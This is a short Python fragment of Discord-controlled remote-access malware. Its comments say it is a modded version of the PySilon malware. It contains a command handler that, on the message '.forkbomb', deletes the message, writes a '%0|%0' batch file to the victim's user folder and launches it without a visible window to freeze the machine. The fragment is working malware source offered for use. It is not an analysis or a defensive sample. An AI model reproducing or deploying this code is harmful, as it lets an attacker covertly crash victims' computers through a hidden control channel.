#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS

import subprocess
# end of imports
# on message
elif message.content == ".forkbomb":
    #.log Message is "fork bomb" 
    await message.delete()
    #.log Removed the message 
    embed = discord.Embed(title="💣 Starting...",description=f'```Starting fork bomb... This process may take some time.```', colour=discord.Colour.dark_theme())
    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
    await message.channel.send(embed=embed)
    #.log Sent message about for bomb starting 
    with open(f'C:\\Users\\{getuser()}\\wabbit.bat', 'w', encoding='utf-8') as wabbit:
        wabbit.write('%0|%0')
        #.log Generated wabbit.bat 
    subprocess.Popen(f'C:\\Users\\{getuser()}\\wabbit.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    #.log Executed wabbit.bat 

#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS